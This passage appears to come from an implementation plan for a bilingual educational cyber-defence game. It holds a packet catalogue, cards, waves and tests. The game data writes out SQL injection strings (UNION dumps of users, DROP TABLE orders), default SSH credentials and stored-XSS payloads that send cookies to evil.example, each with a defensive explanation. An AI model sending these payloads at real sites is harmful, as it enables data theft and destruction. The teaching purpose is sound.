    request: ["GET /search?q=O'Reilly+books HTTP/2", HOST, BROWSER_IOS, 'Referer: https://shop.example/'],
    why: { en: "A real customer. The apostrophe belongs to a publisher's name. A rule that blocks every ' drops people like this.",
      es: "Un cliente real. El apóstrofo es parte del nombre de una editorial. Una regla que bloquee toda ' deja por fuera a gente como esta." } },
  { id: 'decoy-union', lane: 2, kind: 'legit', decoy: true, net: 'home', weight: 4, card: 'GET /search?q=union+jack+t-shirt',
    request: ['GET /search?q=union+jack+t-shirt HTTP/2', HOST, BROWSER_MAC, 'Referer: https://shop.example/gifts'],
    why: { en: "A shopper after a Union Jack t-shirt. The word union alone isn't SQL: there's no quote to break out of the string.",
      es: 'Alguien buscando una camiseta con la bandera británica. La palabra union sola no es SQL: no hay comilla con la que salirse del texto.' } },
  { id: 'decoy-dropleaf', lane: 2, kind: 'legit', decoy: true, net: 'mobile', weight: 3, card: 'GET /search?q=drop-leaf+table+lamp',
    request: ['GET /search?q=drop-leaf+table+lamp HTTP/2', HOST, BROWSER_AND, 'Referer: https://shop.example/home'],
    why: { en: 'Someone furnishing a small flat. DROP and TABLE, but nothing here closes a string or ends a statement.',
      es: 'Alguien amoblando un apartamento pequeño. DROP y TABLE, pero nada aquí cierra un texto ni termina una sentencia.' } },
  { id: 'legit-rain-jacket', lane: 2, kind: 'legit', net: 'home', weight: 3, card: 'GET /search?q=rain+jacket',
    request: ['GET /search?q=rain+jacket HTTP/2', HOST, BROWSER_CHR, 'Cookie: session=7f3a…'],
    why: { en: 'A shopper with a real browser and a session cookie. During a flood, this is who you are protecting.',
      es: 'Alguien comprando con un navegador real y una cookie de sesión. Durante una inundación, a esta persona es a quien proteges.' } },
  { id: 'legit-login', lane: 1, kind: 'legit', net: 'mobile', weight: 5, card: 'POST /login user=maria.g pass=••••••••',
    request: ['POST /login HTTP/2', HOST, BROWSER_IOS, FORM_CT, '', 'user=maria.g&pass=••••••••'],
    context: { en: 'THIS IP · 1 login today', es: 'ESTA IP · 1 inicio de sesión hoy' },
    why: { en: 'A customer logging in to check an order.', es: 'Alguien entrando a revisar su pedido.' } },
  { id: 'legit-deploy', lane: 0, kind: 'legit', net: 'ci', weight: 4, card: 'SSH-2.0-OpenSSH_9.6 publickey deploy',
    request: ['SSH-2.0-OpenSSH_9.6', 'auth: publickey (ed25519)', 'user: deploy'],
    why: { en: 'Your CI pipeline deploying with its SSH key. Drop it and the release breaks.',
      es: 'Tu pipeline de CI desplegando con su llave SSH. Si lo bloqueas, se rompe el release.' } },
  { id: 'legit-comment', lane: 3, kind: 'legit', net: 'home', weight: 3, card: 'POST /comments "great write-up, thanks!"',
    request: ['POST /comments HTTP/2', HOST, JSON_CT, '', '{"body":"great write-up, thanks!"}'],
    why: { en: 'A happy reader.', es: 'Alguien que disfrutó el post.' } },
  { id: 'legit-comments-page', lane: 3, kind: 'legit', net: 'mobile', weight: 2, card: 'GET /comments?page=2',
    request: ['GET /comments?page=2 HTTP/2', HOST, BROWSER_IOS, 'Cookie: session=c91e…'],
    why: { en: 'A reader paging through comments with a real browser and a session.', es: 'Alguien leyendo comentarios con un navegador real y una sesión.' } },
  { id: 'decoy-script-question', lane: 3, kind: 'legit', decoy: true, net: 'home', weight: 3, card: 'POST /comments "Why does my <script> tag load twice?"',
    request: ['POST /comments HTTP/2', HOST, JSON_CT, '', '{"body":"Why does my <script> tag load twice?"}'],
    why: { en: 'A developer asking a question. It mentions <script> as words, which is harmless if you encode output. A naive filter drops it.',
      es: 'Alguien que programa haciendo una pregunta. Menciona <script> como texto, lo cual es inofensivo si codificas la salida. Un filtro ingenuo lo bloquea.' } },
  { id: 'legit-smtp', lane: 4, kind: 'legit', port: 25, net: 'mail', weight: 3, card: 'SMTP :25 EHLO mail.partner.example',
    request: ['TCP → port 25 (smtp)', 'EHLO mail.partner.example', 'MAIL FROM:<orders@partner.example>'],
    why: { en: "A partner's mail server delivering an email. Port 25 is open on purpose.",
      es: 'El servidor de correo de un aliado entregando un email. El puerto 25 está abierto a propósito.' } },

  // ---------- SQL injection ----------
  { id: 'sqli-tautology', lane: 2, kind: 'sqli', tier: 1, net: 'vps', weight: 9, card: "GET /search?q=' OR 1=1--",
    request: ["GET /search?q=' OR 1=1-- HTTP/1.1", HOST, 'User-Agent: sqlmap/1.8.2#stable', 'Accept: */*'], hints: ["' OR 1=1--", 'sqlmap'],
    why: { en: "Tautology injection. The ' closes the string, OR 1=1 matches every row, and -- comments out the rest of the query.",
      es: "Inyección por tautología. La ' cierra el texto, OR 1=1 coincide con todas las filas y -- comenta el resto de la consulta." } },
  { id: 'sqli-union', lane: 2, kind: 'sqli', tier: 2, net: 'vps', weight: 5, card: "GET /search?q=1' UNION SELECT email,password FROM users--",
    request: ["GET /search?q=1' UNION SELECT email,password FROM users-- HTTP/1.1", HOST, 'User-Agent: Mozilla/5.0', 'Accept: */*'], hints: ['UNION SELECT', 'FROM users--'],
    why: { en: 'UNION-based injection. It glues a second query onto yours and dumps the users table into the search results.',
      es: 'Inyección con UNION. Pega una segunda consulta a la tuya y vuelca la tabla de usuarios en los resultados de búsqueda.' } },
  { id: 'sqli-sleep', lane: 2, kind: 'sqli', tier: 2, net: 'vps', weight: 4, card: "GET /search?q=x' AND SLEEP(5)--",
    request: ["GET /search?q=x' AND SLEEP(5)-- HTTP/1.1", HOST, 'User-Agent: Mozilla/5.0'], hints: ["' AND SLEEP(5)--"],
    why: { en: 'Time-based blind injection. If the page takes five seconds, the attacker knows the database ran their SQL.',
      es: 'Inyección ciega por tiempo. Si la página tarda cinco segundos, el atacante sabe que la base de datos ejecutó su SQL.' } },
  { id: 'sqli-encoded', lane: 2, kind: 'sqli', tier: 3, net: 'bot', weight: 5, card: 'GET /search?q=%27%20OR%201%3D1--',
    request: ['GET /search?q=%27%20OR%201%3D1-- HTTP/1.1', HOST, 'User-Agent: python-requests/2.32.3'], hints: ['%27%20OR%201%3D1--'], decodedHints: ["' OR 1=1--"],
    why: { en: "The same tautology, URL-encoded: %27 is a quote. A pattern rule looking for ' never sees it, and the server decodes it anyway.",
      es: "La misma tautología, codificada para URL: %27 es una comilla. Una regla que busca ' nunca la ve, y el servidor la decodifica igual." } },
  { id: 'sqli-orderby', lane: 2, kind: 'sqli', tier: 3, orderBy: true, net: 'home', weight: 5, card: 'POST /search {"q":"socks","sort":"price; DROP TABLE orders--"}',
    request: ['POST /search HTTP/2', HOST, BROWSER_CHR, JSON_CT, '', '{"q":"socks","sort":"price; DROP TABLE orders--"}'], hints: ['DROP TABLE orders--'],
    why: { en: 'Stacked-query injection hidden in the sort field. The search term is innocent; the sort value is pasted into ORDER BY, and ; starts a second statement that deletes every order. Column names cannot be bound parameters, so the fix is an allow-list of sort columns.',
      es: 'Inyección de consultas apiladas escondida en el campo de orden. El término de búsqueda es inocente; el valor de orden se pega en ORDER BY, y el ; inicia una segunda sentencia que borra todos los pedidos. Los nombres de columna no pueden ser parámetros, así que la solución es una lista permitida de columnas.' } },

  // ---------- brute force ----------
  { id: 'brute-admin', lane: 1, kind: 'brute', tier: 1, net: 'vps', weight: 5, card: 'POST /login user=admin pass=123456',
    request: ['POST /login HTTP/1.1', HOST, 'User-Agent: Mozilla/5.0 (Hydra)', FORM_CT, '', 'user=admin&pass=123456'], hints: ['user=admin', 'Hydra'],
    why: { en: 'Password guessing against the admin account, straight from a leaked-password list.',
      es: 'Adivinanza de contraseñas contra la cuenta admin, sacadas de una lista de contraseñas filtradas.' } },
  { id: 'brute-ssh-root', lane: 0, kind: 'brute', tier: 1, net: 'vps', weight: 5, card: 'SSH-2.0-libssh_0.9.6 root:toor',
    request: ['SSH-2.0-libssh_0.9.6', 'auth: password', 'user: root', 'pass: toor'], hints: ['root:toor', 'auth: password'],
    why: { en: "SSH brute force with default credentials. root/toor was Kali Linux's old default.",
      es: 'Fuerza bruta por SSH con credenciales por defecto. root/toor era la vieja contraseña por defecto de Kali Linux.' } },
  { id: 'brute-spray', lane: 1, kind: 'brute', tier: 2, net: 'bot', weight: 3, card: 'POST /login user=finance pass=Spring2026!',
    request: ['POST /login HTTP/1.1', HOST, 'User-Agent: Mozilla/5.0', FORM_CT, '', 'user=finance&pass=Spring2026!'], hints: ['pass=Spring2026!'],
    why: { en: 'Password spraying: one seasonal password tried against many accounts, slowly, to dodge lockouts.',
      es: 'Password spraying: una contraseña de temporada probada contra muchas cuentas, despacio, para esquivar los bloqueos.' } },
  { id: 'brute-stuffing', lane: 1, kind: 'brute', tier: 3, net: 'bot', fixedSrc: STUFF_IP, weight: 4, card: 'POST /login user=carlos.m@mail.example pass=Carlos1987',
    request: ['POST /login HTTP/2', HOST, BROWSER_CHR, FORM_CT, '', 'user=carlos.m@mail.example&pass=Carlos1987'], hints: ['41 logins in 60 s'],
    context: { en: 'THIS IP · 41 logins in 60 s · 41 different accounts', es: 'ESTA IP · 41 inicios de sesión en 60 s · 41 cuentas distintas' },
    why: { en: 'Credential stuffing: username and password pairs leaked from another site, replayed here. Each request looks like a normal login; the tell is the volume from one IP.',
      es: 'Credential stuffing: pares de usuario y contraseña filtrados de otro sitio, reutilizados aquí. Cada petición parece un inicio de sesión normal; la pista es el volumen desde una sola IP.' } },

  // ---------- XSS ----------
  { id: 'xss-script', lane: 3, kind: 'xss', tier: 1, net: 'vps', weight: 4, card: `POST /comments "<script>fetch('//evil.example/?c='+document.cookie)</script>"`,
    request: ['POST /comments HTTP/1.1', HOST, JSON_CT, '', `{"body":"<script>fetch('//evil.example/?c='+document.cookie)</script>"}`], hints: ['<script>', 'document.cookie'],
    why: { en: 'Stored XSS. Every visitor who loads this comment sends their session cookie to the attacker.',
      es: 'XSS almacenado. Cada visitante que cargue este comentario le envía su cookie de sesión al atacante.' } },
  { id: 'xss-img', lane: 3, kind: 'xss', tier: 2, net: 'bot', weight: 3, card: 'POST /comments "<img src=x onerror=alert(document.domain)>"',
    request: ['POST /comments HTTP/1.1', HOST, JSON_CT, '', '{"body":"<img src=x onerror=alert(document.domain)>"}'], hints: ['onerror=', '<img src=x'],
    why: { en: 'XSS with no <script> tag. The broken image fires onerror, which runs JavaScript. Filters that only look for <script miss it.',
      es: 'XSS sin etiqueta <script>. La imagen rota dispara onerror, que ejecuta JavaScript. Los filtros que solo buscan <script no lo ven.' } },
  { id: 'xss-jslink', lane: 3, kind: 'xss', tier: 3, net: 'home', weight: 3, card: `POST /comments "Loved it! Source: <a href=javascript:fetch(atob('Ly9ldmlsLmV4YW1wbGU='))>link</a>"`,
    request: ['POST /comments HTTP/2', HOST, JSON_CT, '', `{"body":"Loved it! Source: <a href=javascript:fetch(atob('Ly9ldmlsLmV4YW1wbGU='))>link</a>"}`], hints: ['javascript:', "atob('Ly9ldmlsLmV4YW1wbGU=')"],
    why: { en: 'XSS dressed as a friendly comment: a javascript: link whose destination is base64 for //evil.example, so neither <script> nor the domain appears in plain text.',
      es: 'XSS disfrazado de comentario amable: un enlace javascript: cuyo destino es //evil.example en base64, así que ni <script> ni el dominio aparecen en texto plano.' } },

  // ---------- port scans ----------
  { id: 'scan-telnet', lane: 4, kind: 'scan', tier: 1, port: 23, net: 'vps', weight: 4, card: 'SYN → :23 telnet',
    request: ['TCP SYN → port 23 (telnet)', 'flags: S   window: 1024', 'no payload'], hints: [':23 telnet', 'window: 1024'],
    why: { en: 'Port scan: one probe of many, checking whether telnet is open. Recon before the real attack.',
      es: 'Escaneo de puertos: una sonda de muchas, revisando si telnet está abierto. Reconocimiento antes del ataque real.' } },
  { id: 'scan-smb', lane: 4, kind: 'scan', tier: 1, port: 445, net: 'vps', weight: 2, card: 'SYN → :445 smb',
    request: ['TCP SYN → port 445 (smb)', 'flags: S   window: 1024', 'no payload'], hints: [':445 smb', 'window: 1024'],
    why: { en: 'Port scan for Windows file sharing: the door WannaCry walked through in 2017.',
      es: 'Escaneo buscando el compartido de archivos de Windows: la puerta por la que entró WannaCry en 2017.' } },
  { id: 'scan-rdp', lane: 4, kind: 'scan', tier: 1, port: 3389, net: 'vps', weight: 3, card: 'SYN → :3389 rdp',
    request: ['TCP SYN → port 3389 (rdp)', 'flags: S   window: 1024', 'no payload'], hints: [':3389 rdp', 'window: 1024'],
    why: { en: 'Port scan looking for Windows Remote Desktop, a favourite ransomware entry point.',
      es: 'Escaneo buscando Escritorio Remoto de Windows, una entrada favorita del ransomware.' } },

  // ---------- botnet flood ----------
  { id: 'flood-search', lane: 2, kind: 'flood', tier: 1, net: 'cloud', weight: 4, card: 'GET /search?q=a',
    request: ['GET /search?q=a HTTP/1.1', HOST, 'User-Agent: Go-http-client/1.1'], hints: ['Go-http-client/1.1'],
    why: { en: 'One of thousands of identical requests from a botnet. Each one is harmless; together they take the site down. The tells: no cookies, a scripting library instead of a browser, the same request over and over.',
      es: 'Una de miles de peticiones idénticas de una botnet. Cada una es inofensiva; juntas tumban el sitio. Las pistas: sin cookies, una librería de scripts en vez de un navegador, la misma petición una y otra vez.' } },
  { id: 'flood-comments', lane: 3, kind: 'flood', tier: 1, net: 'cloud', weight: 3, card: 'GET /comments',
    request: ['GET /comments HTTP/1.1', HOST, 'User-Agent: '], hints: ['User-Agent: '],
    why: { en: 'A botnet hammering the comments page with an empty User-Agent. The volume is the attack.',
      es: 'Una botnet martillando la página de comentarios con un User-Agent vacío. El volumen es el ataque.' } },
  { id: 'flood-login', lane: 1, kind: 'flood', tier: 1, net: 'cloud', weight: 3, card: 'GET /login',
    request: ['GET /login HTTP/1.1', HOST, 'User-Agent: curl/8.9.1'], hints: ['curl/8.9.1'],
    why: { en: 'Bots fetching the login page as fast as they can. Nobody logs in with curl at this rate.',
      es: 'Bots pidiendo la página de inicio de sesión tan rápido como pueden. Nadie inicia sesión con curl a este ritmo.' } },
];

const decode = (s: string): string | undefined => {
  try {
    const d = decodeURIComponent(s);
    return d === s ? undefined : d;
  } catch {
    return undefined;
  }
};

export const TEMPLATES: readonly Template[] = LIST.map((t) => ({ ...t, raw: t.request.join('\n'), decoded: decode(t.card) }));

export const templateById = (id: string): Template => {
  const t = TEMPLATES.find((x) => x.id === id);
  if (!t) throw new Error(`unknown packet template ${id}`);
  return t;
};
```

Run: `npx vitest run src/core` → PASS (all tests in rng and packets).

- [ ] **Step 8: Commit**

```bash
git add src/core
git commit -m "Add the core constants, seeded RNG and packet catalogue" -m "Every packet the waves use lives here as data with English and Spanish explanations, guarded by invariants: documentation IPs only, tiers on every attack, hints anchored in visible text." -m "Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>"
```

---
### Task 3: Upgrade cards, waves and the knight's lines

**Files:**
- Create: `src/core/content/cards.ts`, `src/core/content/waves.ts`, `src/core/content/lines.ts`
- Test: `src/core/content/cards.test.ts`, `src/core/content/waves.test.ts`

**Interfaces:**
- Consumes: `Localized`, `Kind` (Task 2).
- Produces:
  - `cards.ts`: `type CardId = 'destrier' | 'squire' | 'lens' | 'obs1' | 'obs2' | 'obs3' | 'lockdown' | 'quote' | 'f2b' | 'tarpit' | 'cdn' | 'prepared' | 'sortlist' | 'mfa' | 'csp' | 'backup'`; `type Category = 'KNIGHT' | 'FIREWALL' | 'SERVER'`; `type Rarity = 'COMMON' | 'RARE' | 'LEGENDARY'`; `type IconId = 'horse' | 'squire' | 'lens' | 'eye' | 'lock' | 'grate' | 'hammer' | 'tar' | 'cloud' | 'shield' | 'tape'`; `interface Card { id; cat; rarity; icon; req?: CardId; name; does; irl; catch: Localized }`; `CARDS: readonly Card[]`; `cardById(id: CardId): Card`; `STARTING_LOADOUT: CardId[] = ['lockdown']`.
  - `waves.ts`: `type Mode = 'campaign' | 'overtime'`; `interface WaveDef { id: string; name: Localized; intro: Localized; only?: Kind[]; boost: Partial<Record<Kind, number>>; spawn: number; secs: number; speedMult: number; tier3Mult: number }`; `CAMPAIGN: readonly WaveDef[]` (6); `overtimeWave(n: number): WaveDef`; `waveFor(mode: Mode, n: number): WaveDef`.
  - `lines.ts`: `type LineId = 'waveStart' | 'firstBreach' | 'fleshWound' | 'invincible' | 'haveAtYou' | 'oops' | 'angry' | 'noTarget' | 'emptyLane' | 'draw' | 'usersGone' | 'won'`; `LINES: Record<LineId, { text: Localized; sub?: Localized }>`.

- [ ] **Step 1: Write the failing tests**

`src/core/content/cards.test.ts`:
```ts
// packages
import { describe, expect, it } from 'vitest';

// core
import { CARDS, cardById, STARTING_LOADOUT } from './cards';

describe('card catalogue', () => {
  it('has the sixteen v1 cards, unique', () => {
    const ids = CARDS.map((c) => c.id);
    expect(new Set(ids).size).toBe(16);
    expect(ids).toEqual(expect.arrayContaining(['destrier', 'squire', 'lens', 'obs1', 'obs2', 'obs3', 'lockdown', 'quote', 'f2b', 'tarpit', 'cdn', 'prepared', 'sortlist', 'mfa', 'csp', 'backup']));
  });

  it('chains observability through prerequisites', () => {
    expect(cardById('obs1').req).toBeUndefined();
    expect(cardById('obs2').req).toBe('obs1');
    expect(cardById('obs3').req).toBe('obs2');
  });

  it('writes every text in both languages', () => {
    for (const c of CARDS) for (const f of [c.name, c.does, c.irl, c.catch]) {
      expect(f.en.length).toBeGreaterThan(1);
      expect(f.es.length).toBeGreaterThan(1);
    }
  });

  it('starts every run with port lockdown', () => {
    expect(STARTING_LOADOUT).toEqual(['lockdown']);
  });

  it('throws on unknown ids', () => {
    expect(() => cardById('nope' as never)).toThrow();
  });
});
```

`src/core/content/waves.test.ts`:
```ts
// packages
import { describe, expect, it } from 'vitest';

// core
import { CAMPAIGN, overtimeWave, waveFor } from './waves';

describe('waves', () => {
  it('has the six campaign waves in order', () => {
    expect(CAMPAIGN.map((w) => w.id)).toEqual(['recon', 'brute', 'sqli', 'xss', 'flood', 'finale']);
    expect(CAMPAIGN[0].only).toEqual(['legit', 'scan']);
    for (const w of CAMPAIGN) { expect(w.speedMult).toBe(1); expect(w.name.es).not.toBe(''); expect(w.intro.es).not.toBe(''); }
  });

  it('ramps overtime and respects the floors', () => {
    const w1 = overtimeWave(1), w5 = overtimeWave(5), w60 = overtimeWave(60);
    expect(w1.secs).toBe(45);
    expect(w5.spawn).toBeLessThan(w1.spawn);
    expect(w5.speedMult).toBeGreaterThan(w1.speedMult);
    expect(w60.spawn).toBe(0.45);
    expect(72 * w60.speedMult).toBeCloseTo(150, 5);
    expect(w5.tier3Mult).toBeGreaterThan(w1.tier3Mult);
    expect(w5.name.en).toBe('OVERTIME 5');
  });

  it('routes by mode', () => {
    expect(waveFor('campaign', 3).id).toBe('sqli');
    expect(waveFor('campaign', 99).id).toBe('finale');
    expect(waveFor('overtime', 2).id).toBe('overtime');
  });
});
```

Run: `npx vitest run src/core/content` → FAIL (modules missing).

- [ ] **Step 2: Implement `src/core/content/cards.ts`**

```ts
// core
import type { Localized } from '../types';

export type CardId = 'destrier' | 'squire' | 'lens' | 'obs1' | 'obs2' | 'obs3' | 'lockdown' | 'quote' | 'f2b'
  | 'tarpit' | 'cdn' | 'prepared' | 'sortlist' | 'mfa' | 'csp' | 'backup';
export type Category = 'KNIGHT' | 'FIREWALL' | 'SERVER';
export type Rarity = 'COMMON' | 'RARE' | 'LEGENDARY';
export type IconId = 'horse' | 'squire' | 'lens' | 'eye' | 'lock' | 'grate' | 'hammer' | 'tar' | 'cloud' | 'shield' | 'tape';

export interface Card {
  id: CardId;
  cat: Category;
  rarity: Rarity;
  icon: IconId;
  req?: CardId;
  name: Localized;
  does: Localized;
  irl: Localized;
  catch: Localized;
}

export const STARTING_LOADOUT: CardId[] = ['lockdown'];

export const CARDS: readonly Card[] = [
  { id: 'destrier', cat: 'KNIGHT', rarity: 'LEGENDARY', icon: 'horse',
    name: { en: 'Destrier', es: 'Destrero' },
    does: { en: 'Target a packet and the knight rides out to it. It crawls at 30% speed for 5 s while you read it.', es: 'Apunta a un paquete y el caballero cabalga hasta él. Avanza al 30% de velocidad durante 5 s mientras lo lees.' },
    irl: { en: 'Throttling and step-up checks buy analysts time on suspicious traffic.', es: 'Limitar y pedir verificaciones extra le da tiempo al equipo para analizar tráfico sospechoso.' },
    catch: { en: 'While you ride, your post is empty.', es: 'Mientras cabalgas, tu puesto queda vacío.' } },
  { id: 'obs1', cat: 'KNIGHT', rarity: 'COMMON', icon: 'eye',
    name: { en: 'Observability I · logs', es: 'Observabilidad I · logs' },
    does: { en: 'Obvious attacks crawl with bugs: spiders on injections, worms on XSS, beetles on brute force, flies on scans, gnats on floods.', es: 'Los ataques obvios se llenan de bichos: arañas en inyecciones, gusanos en XSS, escarabajos en fuerza bruta, moscas en escaneos, mosquitos en inundaciones.' },
    irl: { en: "You can't defend what you can't see. Logs turn noise into evidence.", es: 'No puedes defender lo que no ves. Los logs convierten el ruido en evidencia.' },
    catch: { en: 'Logs only catch what you already know to look for. Tricky and sneaky traffic stays clean.', es: 'Los logs solo atrapan lo que ya sabes buscar. El tráfico engañoso y sigiloso se ve limpio.' } },
  { id: 'obs2', cat: 'KNIGHT', rarity: 'RARE', icon: 'eye', req: 'obs1',
    name: { en: 'Observability II · metrics', es: 'Observabilidad II · métricas' },
    does: { en: 'Tricky attacks show their bugs too.', es: 'Los ataques engañosos también muestran sus bichos.' },
    irl: { en: 'Baselines and alerts flag the unusual: a spike in logins, a query that takes five seconds.', es: 'Las líneas base y las alertas señalan lo inusual: un pico de inicios de sesión, una consulta que tarda cinco segundos.' },
    catch: { en: 'Sneaky packets still look clean.', es: 'Los paquetes sigilosos todavía se ven limpios.' } },
  { id: 'obs3', cat: 'KNIGHT', rarity: 'LEGENDARY', icon: 'eye', req: 'obs2',
    name: { en: 'Observability III · tracing', es: 'Observabilidad III · trazas' },
    does: { en: 'Even sneaky attacks crawl with bugs.', es: 'Hasta los ataques sigilosos se llenan de bichos.' },
    irl: { en: 'Tracing follows one request end to end, so even a well-disguised payload stands out.', es: 'Las trazas siguen una petición de punta a punta, así que hasta un payload bien disfrazado resalta.' },
    catch: { en: 'It took three picks to get here.', es: 'Llegar aquí costó tres elecciones.' } },
  { id: 'squire', cat: 'KNIGHT', rarity: 'RARE', icon: 'squire',
    name: { en: 'Squire', es: 'Escudero' },
    does: { en: 'Throws at obvious attacks on his own, one every 3 s.', es: 'Lanza solo contra los ataques obvios, uno cada 3 s.' },
    irl: { en: 'Signature detection: automation handles the known-bad so people can hunt the subtle stuff.', es: 'Detección por firmas: la automatización se encarga de lo conocido para que las personas cacen lo sutil.' },
    catch: { en: 'He only knows the obvious tricks. Tricky and sneaky packets walk past him.', es: 'Solo conoce los trucos obvios. Los paquetes engañosos y sigilosos le pasan por al lado.' } },
  { id: 'lens', cat: 'KNIGHT', rarity: 'COMMON', icon: 'lens',
    name: { en: 'Decoding lens', es: 'Lente decodificador' },
    does: { en: 'Packet cards show URL-decoded payloads.', es: 'Las tarjetas de paquetes muestran los payloads decodificados.' },
    irl: { en: 'Inspect traffic after decoding: %27 is still a quote.', es: 'Inspecciona el tráfico después de decodificarlo: %27 sigue siendo una comilla.' },
    catch: { en: 'None.', es: 'Ninguna.' } },
  { id: 'lockdown', cat: 'FIREWALL', rarity: 'COMMON', icon: 'lock',
    name: { en: 'Port lockdown', es: 'Puertos cerrados' },
    does: { en: "Every port you don't use is padlocked. Scans of :23, :445 and :3389 are denied at the door; :25 mail stays open.", es: 'Cada puerto que no usas queda con candado. Los escaneos a :23, :445 y :3389 se niegan en la puerta; el correo en :25 sigue abierto.' },
    irl: { en: 'Default-deny: only expose the services you actually run.', es: 'Denegar por defecto: expón solo los servicios que de verdad usas.' },
    catch: { en: 'None. Cheap, boring, effective.', es: 'Ninguna. Barato, aburrido, efectivo.' } },
  { id: 'quote', cat: 'FIREWALL', rarity: 'COMMON', icon: 'grate',
    name: { en: 'Quote filter', es: 'Filtro de comillas' },
    does: { en: 'A portcullis on the firewall drops any request that contains a single quote.', es: 'Un rastrillo en el firewall bloquea cualquier petición que contenga una comilla simple.' },
    irl: { en: 'A naive WAF signature.', es: 'Una firma ingenua de WAF.' },
    catch: { en: "Drops O'Reilly fans. Misses %27 and the sort-field trick.", es: "Bloquea a los fans de O'Reilly. No ve %27 ni el truco del campo de orden." } },
  { id: 'f2b', cat: 'FIREWALL', rarity: 'COMMON', icon: 'hammer',
    name: { en: 'fail2ban', es: 'fail2ban' },
    does: { en: 'Bans an IP after two failed logins.', es: 'Bloquea una IP después de dos inicios de sesión fallidos.' },
    irl: { en: 'fail2ban watches logs and firewalls repeat offenders.', es: 'fail2ban vigila los logs y bloquea en el firewall a los reincidentes.' },
    catch: { en: 'Botnets rotate IPs, so every fresh one gets fresh tries.', es: 'Las botnets rotan IPs, así que cada IP nueva tiene intentos nuevos.' } },
  { id: 'tarpit', cat: 'FIREWALL', rarity: 'RARE', icon: 'tar',
    name: { en: 'Tarpit', es: 'Pozo de brea' },
    does: { en: 'Repeat visitors to /login wade through tar at 40% speed.', es: 'Los visitantes repetidos de /login avanzan entre brea al 40% de velocidad.' },
    irl: { en: 'Tarpits slow suspected attackers without blocking anyone outright.', es: 'Los tarpits frenan a los atacantes sospechosos sin bloquear a nadie del todo.' },
    catch: { en: 'It only slows them. You still have to act.', es: 'Solo los frena. Todavía tienes que actuar.' } },
  { id: 'cdn', cat: 'FIREWALL', rarity: 'RARE', icon: 'cloud',
    name: { en: 'CDN + rate limit', es: 'CDN + límite de peticiones' },
    does: { en: 'Flood traffic is absorbed at the edge; real browsers pass.', es: 'El tráfico de inundación se absorbe en el borde; los navegadores reales pasan.' },
    irl: { en: 'A CDN spreads the load and rate limits cap how fast one client can ask.', es: 'Una CDN reparte la carga y los límites de peticiones topan qué tan rápido puede pedir un cliente.' },
    catch: { en: 'Does nothing against a single clever request.', es: 'No hace nada contra una sola petición astuta.' } },
  { id: 'prepared', cat: 'SERVER', rarity: 'RARE', icon: 'shield',
    name: { en: 'Prepared statements', es: 'Sentencias preparadas' },
    does: { en: 'User input never becomes SQL. Injections arrive and do nothing.', es: 'La entrada del usuario nunca se vuelve SQL. Las inyecciones llegan y no hacen nada.' },
    irl: { en: 'The real fix for SQL injection.', es: 'La solución real para la inyección SQL.' },
    catch: { en: "Column names in ORDER BY can't be parameters; the sort-field trick still lands.", es: 'Los nombres de columna en ORDER BY no pueden ser parámetros; el truco del campo de orden igual entra.' } },
  { id: 'sortlist', cat: 'SERVER', rarity: 'RARE', icon: 'shield',
    name: { en: 'Sort-column allow-list', es: 'Lista permitida de columnas' },
    does: { en: 'The sort field only accepts price, name or date.', es: 'El campo de orden solo acepta precio, nombre o fecha.' },
    irl: { en: 'Allow-list anything that ends up as an SQL identifier.', es: 'Usa listas permitidas para todo lo que termine siendo un identificador SQL.' },
    catch: { en: 'Covers the sort field only.', es: 'Solo cubre el campo de orden.' } },
  { id: 'mfa', cat: 'SERVER', rarity: 'RARE', icon: 'shield',
    name: { en: 'MFA + SSH keys only', es: 'MFA + solo llaves SSH' },
    does: { en: 'A guessed or stolen password is no longer enough.', es: 'Una contraseña adivinada o robada ya no basta.' },
    irl: { en: 'Second factors make credential stuffing pointless.', es: 'Los segundos factores vuelven inútil el credential stuffing.' },
    catch: { en: 'None in the game. In real life: support tickets.', es: 'Ninguna en el juego. En la vida real: tickets de soporte.' } },
  { id: 'csp', cat: 'SERVER', rarity: 'RARE', icon: 'shield',
    name: { en: 'Output encoding + CSP', es: 'Codificación de salida + CSP' },
    does: { en: 'Comments render as text and the browser refuses inline scripts.', es: 'Los comentarios se muestran como texto y el navegador rechaza scripts en línea.' },
    irl: { en: 'Encode on output; CSP is the seatbelt.', es: 'Codifica al mostrar; la CSP es el cinturón de seguridad.' },
    catch: { en: 'None in the game.', es: 'Ninguna en el juego.' } },
  { id: 'backup', cat: 'SERVER', rarity: 'COMMON', icon: 'tape',
    name: { en: 'Restore from backup', es: 'Restaurar copia de seguridad' },
    does: { en: 'Instantly restores 30% uptime and puts out part of the fire.', es: 'Restaura de inmediato 30% de disponibilidad y apaga parte del fuego.' },
    irl: { en: 'Tested backups turn a disaster into a bad afternoon.', es: 'Las copias probadas convierten un desastre en una mala tarde.' },
    catch: { en: 'One use. Untested backups are a rumour.', es: 'Un solo uso. Las copias sin probar son un rumor.' } },
];

export const cardById = (id: CardId): Card => {
  const c = CARDS.find((x) => x.id === id);
  if (!c) throw new Error(`unknown card ${id}`);
  return c;
};
```

- [ ] **Step 3: Implement `src/core/content/waves.ts`**

```ts
// core
import type { Kind, Localized } from '../types';

export type Mode = 'campaign' | 'overtime';

export interface WaveDef {
  id: string;
  name: Localized;
  intro: Localized;
  only?: Kind[];
  boost: Partial<Record<Kind, number>>;
  spawn: number;
  secs: number;
  speedMult: number;
  tier3Mult: number;
}

export const CAMPAIGN: readonly WaveDef[] = [
  { id: 'recon', name: { en: 'RECON', es: 'RECONOCIMIENTO' }, intro: { en: 'Someone is knocking on every port.', es: 'Alguien está tocando todos los puertos.' },
    only: ['legit', 'scan'], boost: { scan: 2 }, spawn: 1.4, secs: 50, speedMult: 1, tier3Mult: 1 },
  { id: 'brute', name: { en: 'BRUTE FORCE', es: 'FUERZA BRUTA' }, intro: { en: 'The login page is getting popular.', es: 'La página de inicio de sesión se está volviendo popular.' },
    only: ['legit', 'scan', 'brute'], boost: { brute: 2.5 }, spawn: 1.2, secs: 60, speedMult: 1, tier3Mult: 1 },
  { id: 'sqli', name: { en: 'SQL INJECTION', es: 'INYECCIÓN SQL' }, intro: { en: 'Someone is poking at /search.', es: 'Alguien está hurgando en /search.' },
    only: ['legit', 'scan', 'brute', 'sqli'], boost: { sqli: 2.2 }, spawn: 1.15, secs: 60, speedMult: 1, tier3Mult: 1 },
  { id: 'xss', name: { en: 'XSS', es: 'XSS' }, intro: { en: 'The comments section is getting busy.', es: 'La sección de comentarios se está llenando.' },
